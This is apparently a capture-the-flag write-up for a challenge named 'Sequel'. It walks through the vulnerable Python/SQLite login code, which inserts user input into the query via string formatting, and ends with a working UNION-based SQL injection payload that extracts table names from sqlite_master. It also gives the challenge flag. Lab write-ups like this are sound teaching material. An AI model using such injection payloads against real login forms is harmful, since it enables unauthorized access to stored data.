# Sequel

#### Author: Harsh Patil
#### Description: 

> Ever feared of injections? Me too.

# Writeup

- Taking an hint from the challenge name and description, we can guess that this challenge is related to SQL Injections.

- Lets perform some static code analysis. In the sqli_chal.py file, we can see:

```py
conn = sqlite3.connect("database.db", check_same_thread=False)
```

The above code snippet reveals that the database used in the backend is **SQLite**.

```py
def is_invalid_query(query: str) -> bool:
    if query.lower().count("insert") > 1:
        return True

    if "drop" in query.lower():
        return True

    if "delete" in query.lower():
        return True

    return False
```

Alright, this code snippet tells us that the kewords INSERT, DROP, and DELETE are out of the question.

```py
query = 'SELECT * FROM users WHERE username="{}" AND password="{}"'.format(username, password)
```

This above code snippet is the vulnerable line of code. We are passing the user inputs directly without performing any kind of input sanitation.

- Lets take a look at the database.db file provided to us.

```bash
> sqlite3 database.db 

SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
quarkCTF{fake_flag_for_testing}  users 
```

With this, we now know that the flag is present in the database as a table name and we need to create a query allowing us to retrieve table names.

- While searching about SQLite Injections, I came across [this very useful page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) created by [Swissky](https://github.com/swisskyrepo).

- Looking specifically at the `Extract table name` section of the above page, we see the following payload:

```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

- Perfect, we now know how to retrieve all table names from an SQLite database. We just need to craft our payload to exploit this specific page.

- The final payload looks like this:

```sql
" UNION SELECT "1", group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ---
```

**Let me explain what's going on:**

- `"`: To end the `username="` making it `username=""` in the original query, allowing us to inject our payload.
    
- `UNION`: Used to join two queries, allowing us to perform an additional `SELECT` query retrieving the table names.

- `SELECT "1", group_concat(tbl_name)`: We added a `"1"` before `group_concat(tbl_name)` because we are performing an `UNION` with the `users` table which contains two columns. Therefore, we need two columns in this select statement as well.

- `FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ---`: Grabbed from the [amazing page made by Swissky](FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ---).

And that's it. On setting the username as our above malicious payload and the password as any random eight characters, we get our flag.

#### Flag

`quarkCTF{pr3v3nt_m3_by_pr3p4r3d_5t4t3m3nt5}`
